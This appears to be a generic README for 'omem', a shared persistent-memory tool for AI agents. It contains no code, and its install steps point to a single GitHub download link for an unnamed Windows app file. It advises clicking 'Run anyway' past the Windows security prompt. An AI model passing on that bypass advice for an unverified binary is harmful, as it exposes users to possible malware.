# 🧠 omem - Persistent memory for AI agents

[![Download omem](https://img.shields.io/badge/Download-omem-blue?style=for-the-badge&logo=github)](https://github.com/Toperythroblast876/omem)

## 🚀 What omem does

omem gives AI agents a shared memory space that keeps useful context over time. It helps agents remember names, tasks, notes, and team knowledge across sessions.

Use it when you want:
- one memory store for many agents
- shared notes across teams
- persistent memory that keeps its data
- support for OpenCode, Claude Code, OpenClaw, and MCP tools

## 📥 Download and install

1. Open the download page:
   https://github.com/Toperythroblast876/omem
2. On the page, look for the latest release or the main project files.
3. Download the Windows build or install package if one is listed.
4. If you get a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder and look for the app file or setup file.
6. Double-click the file to start omem.

If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.

## 🖥️ Windows setup

Before you start, make sure you have:
- Windows 10 or Windows 11
- A stable internet connection for the first download
- Enough free disk space for the app and its memory data
- Access to a folder where the app can save files

If omem comes as a single app file, you can run it right after download.  
If it comes with a setup file, open the setup file and follow the on-screen steps.

## 🔧 First launch

When you open omem for the first time:
1. Let the app finish loading.
2. Create or choose a memory workspace.
3. Connect the agents or tools you want to use.
4. Add a few test notes so you can check that memory saves correctly.
5. Close the app and open it again to confirm the data remains.

If the app asks where to store data, choose a folder you can find later. A simple folder under Documents works well.

## 🧩 What you can use it for

omem fits well in setups where AI agents need to remember things across turns and across tools.

Common uses:
- save task notes for an agent
- share context between multiple AI tools
- keep team knowledge in one place
- store prompts, preferences, and project details
- search past memory with vector search
- use the same memory store from different clients

## 🤝 Supported tools

omem is built to work with:
- OpenCode
- Claude Code
- OpenClaw
- MCP Server

That means you can use it as a shared memory layer while working in different agent tools. It helps reduce repeated setup and cuts down on lost context.

## 🗂️ How shared memory works

Each agent can read and write to the same memory store. That lets one agent pick up where another left off.

A simple flow looks like this:
1. An agent saves a note.
2. Another agent reads that note later.
3. The second agent uses the note in a new task.
4. The memory stays available for future work.

This setup works well for long projects, team work, and repeated tasks.

## 🔍 Searching memory

omem uses vector search to help find useful content fast. That means you can look up past notes by meaning, not only by exact words.

This is useful when you:
- do not remember the exact text
- want related notes
- need older context from a project
- search for past decisions or instructions

## 📁 Suggested folder layout

If you want to keep things simple on Windows, use a setup like this:

- Documents\omem for app files
- Documents\omem-data for memory data
- Documents\omem-backup for backups

This makes it easier to move, copy, or restore your memory later.

## ⚙️ Basic use

After setup, your daily flow may look like this:
1. Start omem.
2. Open your AI tool.
3. Point the tool to the omem memory source.
4. Save notes or context during work.
5. Reuse that memory in later sessions.

If you work with a team, agree on one memory space name and one data folder. That keeps everyone on the same page.

## 🛠️ If something does not work

If omem does not open:
- check that the download finished
- move the file to a normal folder like Downloads or Documents
- extract the ZIP file again if needed
- try running the app as an administrator

If memory does not save:
- check folder permissions
- make sure the data folder still exists
- confirm that the app can write to the selected path

If another tool cannot connect:
- confirm that the tool points to the right MCP Server address or config
- restart both apps
- check that no other app is using the same port

## 🔐 Keeping your data safe

Since omem stores useful context, keep it in a folder you back up often. Good habits include:
- copying the data folder each week
- using a cloud backup
- keeping one local backup on your PC
- avoiding random folder changes after setup

## 🧭 Good first test

After you install omem, try this:
1. Save a note with your name or project name.
2. Close the app.
3. Open it again.
4. Check that the note is still there.
5. Search for the note using a different phrase.

If that works, your setup is ready.

## 📌 Project topics

- ai-agent
- ai-memory
- claude-code
- lancedb
- llm
- mcp-server
- memory-sharing
- openclaw
- opencode
- persistent-memory
- rust
- vector-search

## 📎 Download link again

[Visit the omem download page](https://github.com/Toperythroblast876/omem)

## 🧾 File notes

If the project offers a ZIP file, keep the ZIP until you confirm the app works.  
If the project offers a setup file, use that for the cleanest install.  
If the project offers a portable build, you can run it from a folder without full setup

## 🔄 Using omem day to day

Once omem is running, you can keep it open while you work with your AI tools. Save the facts you want the agent to keep, then reuse them in later sessions.

Useful things to store:
- project goals
- user names
- team rules
- tool settings
- task status
- past decisions
- repeated prompts